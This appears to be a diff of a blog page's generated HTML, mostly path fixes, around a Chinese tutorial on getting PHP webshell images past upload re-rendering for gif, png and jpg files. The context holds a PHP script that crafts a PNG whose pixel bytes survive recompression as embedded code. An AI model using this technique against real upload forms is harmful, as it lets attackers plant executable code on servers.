@@ -19,28 +19,28 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"diurnal541.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="什么是二次渲染 目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作（如PHP中的imagecreatefromjpeg()等函数），所以普通的图片马都难逃被渲染。而关于图片的二次渲染绕过，可以分为三种：gif、png和jpg，每个的绕过方式不同  gif绕过 我们上传一个gif图片，并且在图片的末尾加上一句话  再上传这个图片马，并且将上传之后的图片下载下来查看  发现末尾写入的一句话不见了">
+    <meta name="description" content="什么是二次渲染 目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作（如PHP中的imagecreatefromjpeg()等函数），所以普通的图片马都难逃被渲染。而关于图片的二次渲染绕过，可以分为三种：gif、png和jpg，每个的绕过方式不同  gif绕过 我们上传一个gif图片，并且在图片的末尾加上一句话   再上传这个图片马，并且将上传之后的图片下载下来查看   发现末尾写入的一句话不">
 <meta property="og:type" content="article">
 <meta property="og:title" content="文件上次之二次渲染绕过">
 <meta property="og:url" content="https://diurnal541.github.io/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/index.html">
 <meta property="og:site_name" content="Mouse">
-<meta property="og:description" content="什么是二次渲染 目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作（如PHP中的imagecreatefromjpeg()等函数），所以普通的图片马都难逃被渲染。而关于图片的二次渲染绕过，可以分为三种：gif、png和jpg，每个的绕过方式不同  gif绕过 我们上传一个gif图片，并且在图片的末尾加上一句话  再上传这个图片马，并且将上传之后的图片下载下来查看  发现末尾写入的一句话不见了">
+<meta property="og:description" content="什么是二次渲染 目前很多网站都会对用户上传的图片再次压缩、裁剪等渲染操作（如PHP中的imagecreatefromjpeg()等函数），所以普通的图片马都难逃被渲染。而关于图片的二次渲染绕过，可以分为三种：gif、png和jpg，每个的绕过方式不同  gif绕过 我们上传一个gif图片，并且在图片的末尾加上一句话   再上传这个图片马，并且将上传之后的图片下载下来查看   发现末尾写入的一句话不">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://diurnal541.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601165549759.png">
-<meta property="og:image" content="https://diurnal541.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601165646301.png">
-<meta property="og:image" content="https://diurnal541.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601172108901.png">
-<meta property="og:image" content="https://diurnal541.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601172116906.png">
-<meta property="og:image" content="https://diurnal541.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601191426480.png">
-<meta property="og:image" content="https://diurnal541.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/format,png.png">
-<meta property="og:image" content="https://diurnal541.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601195738964.png">
-<meta property="og:image" content="https://diurnal541.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601201609745.png">
-<meta property="og:image" content="https://diurnal541.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601201618591.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601165549759.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601165646301.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601172108901.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601172116906.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601191426480.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/format,png.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601195738964.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601201609745.png">
+<meta property="og:image" content="https://diurnal541.github.io/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601201618591.png">
 <meta property="article:published_time" content="2024-06-01T08:06:10.000Z">
 <meta property="article:modified_time" content="2024-06-01T12:26:36.184Z">
 <meta property="article:author" content="Diurnal541">
 <meta property="article:tag" content="文件上传">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://diurnal541.github.io/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601165549759.png">
+<meta name="twitter:image" content="https://diurnal541.github.io/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601165549759.png">
 
 
 <link rel="canonical" href="https://diurnal541.github.io/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/">
@@ -229,13 +229,17 @@
 </blockquote>
 <h1 id="gif绕过"><a href="#gif绕过" class="headerlink" title="gif绕过"></a>gif绕过</h1><blockquote>
 <p>我们上传一个gif图片，并且在图片的末尾加上一句话</p>
-<p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601165549759.png" alt="image-20240601165549759"></p>
+<img src="/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601165549759.png" class="" title="image-20240601165549759">
+
 <p>再上传这个图片马，并且将上传之后的图片下载下来查看</p>
-<p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601165646301.png" alt="image-20240601165646301"></p>
+<img src="/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601165646301.png" class="" title="image-20240601165646301">
+
 <p>发现末尾写入的一句话不见了</p>
 <p>关于gif图片的二次渲染，我们只需要找到渲染前后没有变化的位置，然后将php代码写入，就可以成功上传带有php代码的图片</p>
-<p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601172108901.png" alt="image-20240601172108901"></p>
-<p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601172116906.png" alt="image-20240601172116906"></p>
+<img src="/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601172108901.png" class="" title="image-20240601172108901">
+
+<img src="/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601172116906.png" class="" title="image-20240601172116906">
+
 <p>成功上传</p>
 </blockquote>
 <h1 id="png绕过"><a href="#png绕过" class="headerlink" title="png绕过"></a>png绕过</h1><blockquote>
@@ -243,12 +247,14 @@
 <h1 id="png图片的组成"><a href="#png图片的组成" class="headerlink" title="png图片的组成"></a>png图片的组成</h1><p>png图片由3个以上的数据块组成.</p>
 <p>PNG定义了两种类型的数据块，一种是称为关键数据块(critical chunk)，这是标准的数据块，另一种叫做辅助数据块(ancillary chunks)，这是可选的数据块。关键数据块定义了3个标准数据块(IHDR,IDAT, IEND)，每个PNG文件都必须包含它们.</p>
 <p>数据块结构</p>
-<p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601191426480.png" alt="image-20240601191426480"></p>
+<img src="/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601191426480.png" class="" title="image-20240601191426480">
+
 <p>CRC(cyclic redundancy check)域中的值是对Chunk Type Code域和Chunk Data域中的数据进行计算得到的。CRC具体算法定义在ISO 3309和ITU-T V.42中，其值按下面的CRC码生成多项式进行计算：</p>
 <p>x32+x26+x23+x22+x16+x12+x11+x10+x8+x7+x5+x4+x2+x+1</p>
 <h1 id="分析数据块"><a href="#分析数据块" class="headerlink" title="分析数据块"></a>分析数据块</h1><h3 id="IHDR"><a href="#IHDR" class="headerlink" title="IHDR"></a>IHDR</h3><p>数据块IHDR(header chunk)：它包含有PNG文件中存储的图像数据的基本信息，并要作为第一个数据块出现在PNG数据流中，而且一个PNG数据流中只能有一个文件头数据块。</p>
 <p>文件头数据块由13字节组成，它的格式如下图所示。</p>
-<p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/format,png.png" alt="img"></p>
+<img src="/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/format,png.png" class="" title="img">
+
 <h3 id="PLTE"><a href="#PLTE" class="headerlink" title="PLTE"></a>PLTE</h3><p>调色板PLTE数据块是辅助数据块,对于索引图像，调色板信息是必须的，调色板的颜色索引从0开始编号，然后是1、2……，调色板的颜色数不能超过色深中规定的颜色数（如图像色深为4的时候，调色板中的颜色数不可以超过2^4&#x3D;16），否则，这将导致PNG图像不合法。</p>
 <h3 id="IDAT"><a href="#IDAT" class="headerlink" title="IDAT"></a>IDAT</h3><p>图像数据块IDAT(image data chunk)：它存储实际的数据，在数据流中可包含多个连续顺序的图像数据块。</p>
 <p>IDAT存放着图像真正的数据信息，因此，如果能够了解IDAT的结构，我们就可以很方便的生成PNG图像</p>
@@ -259,7 +265,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="variable">$img</span> = <span class="title function_ invoke__">imagecreatetruecolor</span>(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; <span class="title function_ invoke__">sizeof</span>(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = <span class="title function_ invoke__">imagecolorallocate</span>(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   <span class="title function_ invoke__">imagesetpixel</span>(<span class="variable">$img</span>, <span class="title function_ invoke__">round</span>(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">imagepng</span>(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>运行后得到1.png.上传后下载到本地打开如下图</p>
-<p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601195738964.png" alt="image-20240601195738964"></p>
+<img src="/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601195738964.png" class="" title="image-20240601195738964">
 </blockquote>
 <h1 id="jpg绕过"><a href="#jpg绕过" class="headerlink" title="jpg绕过"></a>jpg绕过</h1><blockquote>
 <p>同样采用脚本来进行绕过</p>
@@ -267,8 +273,9 @@
 
 <h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>随便找一个jpg图片,先上传至服务器然后再下载到本地保存为<code>uploaddemo.jpg</code>（注意要用被二次渲染过后的图片来运行代码）</p>
 <p>使用脚本处理<code>uploaddemo.jpg</code>,命令<code>php practice.php uploaddemo.jpg</code></p>
-<p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601201609745.png" alt="image-20240601201609745"></p>
-<p><img src="/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601201618591.png" alt="image-20240601201618591"></p>
+<img src="/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601201609745.png" class="" title="image-20240601201609745">
+
+<img src="/2024/06/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E4%B9%8B%E4%BA%8C%E6%AC%A1%E6%B8%B2%E6%9F%93%E7%BB%95%E8%BF%87/image-20240601201618591.png" class="" title="image-20240601201618591">
 </blockquote>
 
     </div>
